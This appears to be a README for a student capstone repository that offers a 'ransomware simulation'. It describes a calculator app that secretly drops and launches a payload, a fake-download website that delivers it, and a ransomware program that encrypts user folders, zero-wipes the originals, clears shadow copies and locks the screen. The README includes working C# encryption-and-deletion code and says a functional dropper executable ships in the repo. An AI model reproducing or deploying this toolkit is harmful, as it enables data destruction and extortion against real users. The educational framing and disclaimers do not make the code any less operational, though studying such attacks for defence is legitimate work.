# Ransomware Simulation with Deployment Methods and Mitigation Strategies

**Author:** Aimery Barrault
**Course:** CSCI 460 – Capstone

---

## 🚀 Project Overview

This repository contains a controlled, educational ransomware simulation.

> **Warning:** Do **not** deploy on production systems or without explicit authorization.

* **CalculatorApp.exe**
  A benign “calculator” UI that embeds, drops, and launches the real payload.
* **capstone-site/**
  A Next.js “fake download” website used to deliver the payload.
* **payload.txt** & **base64script.py**
  Utilities to embed and extract the encrypted dropper.

---

## ⚙️ Fake-Download Site Setup

1. **Change into the site directory**

   ```bash
   cd capstone-site
   ```

2. **Install dependencies**

   ```bash
   npm install
   # or
   yarn install
   ```

3. **Add your payload**
   Copy into:

   ```
   capstone-site/public/Downloads
   ```

   > **Note:** The functional dropper executable can also be found directly at `capstone-site/public/Downloads/CalculatorApp.exe` for convenience.

4. **Run in development mode**

   ```bash
   npm run dev
   # or
   yarn dev
   ```

   Then open [http://localhost:3000](http://localhost:3000) in your browser.

---

## 🖥️ CalculatorApp (Dropper UI)

**`MainWindow_CalculatorApp.cs`**   A WPF application that:

1. Displays a standard calculator interface.
2. On trigger (e.g. Backspace), reads a Base64-encoded string.
3. Decodes and writes `CalculatorManager.exe` to `%USERPROFILE%\Documents\`.
4. Launches `CalculatorManager.exe` and exits.

---

## 🔒 Ransomware Simulator

**`MainWindow_Manager.cs`**   A WPF application that performs:

1. **File Encryption**

   * Recursively encrypts files under Desktop, Documents, Pictures, Downloads, and Public Documents.
   * Uses AES-128 CBC with a fresh IV per file, prepended to the ciphertext.
2. **Secure Deletion**

   * Overwrites each original file with zeros, then deletes it.
3. **Countdown Timer**

   * Displays a 24-hour full-screen, top-most UI lockout.
4. **Password-Protected Decryption**

   * Verifies via PBKDF2(SHA-256), allowing up to three attempts.
5. **Self-Destruct**

   * Clears shadow copies, zero-wipes key and flag files, removes the Run-key, then exits.

<details>
<summary>Encryption code excerpt</summary>

```csharp
private void SafeEncryptDirectory(string dir, byte[] aesKey, string self)
{
    string[] files;
    try { files = Directory.GetFiles(dir); }
    catch { return; }

    foreach (var f in files)
    {
        if (f.EndsWith(".aes") || f.Equals(self)) continue;
        try
        {
            using var fin  = new FileStream(f, FileMode.Open, FileAccess.Read);
            using var fout = new FileStream(f + ".aes", FileMode.Create, FileAccess.Write);
            using var aes  = Aes.Create();
            aes.Key     = aesKey;
            aes.GenerateIV();
            aes.Mode    = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            // write IV prefix
            fout.Write(aes.IV, 0, aes.IV.Length);
            using var cs = new CryptoStream(fout, aes.CreateEncryptor(), CryptoStreamMode.Write);
            fin.CopyTo(cs);
        }
        catch (Exception ex)
        {
            File.AppendAllText("error.log", $"ENCRYPT {f} → {ex.Message}\n");
        }
        SecureDelete(f);
    }

    // recurse into subdirectories
    string[] subs;
    try { subs = Directory.GetDirectories(dir); }
    catch { return; }
    foreach (var sub in subs)
        SafeEncryptDirectory(sub, aesKey, self);
}
```

</details>

---

## ✅ Windows VM Execution

1. Copy `CalculatorApp.exe`, `CalculatorManager.exe`, and supporting scripts to a Windows 10 VM.
2. Run:

   ```powershell
   .\CalculatorApp.exe
   ```
3. Observe `.aes` files appearing in Desktop, Documents, etc.
4. Enter the correct password to decrypt and restore files.

---

## ⚖️ Legal Disclaimer

This software is provided **as-is** for **educational purposes only**. Misuse without explicit authorization is prohibited. By using this software, you agree that:

1. You are solely responsible for any damage.
2. The author and institution assume no liability.
3. Run only in isolated, authorized test environments.

---

## 📜 License

This project is released under the MIT License. See [LICENSE.md](LICENSE.md) for full terms.
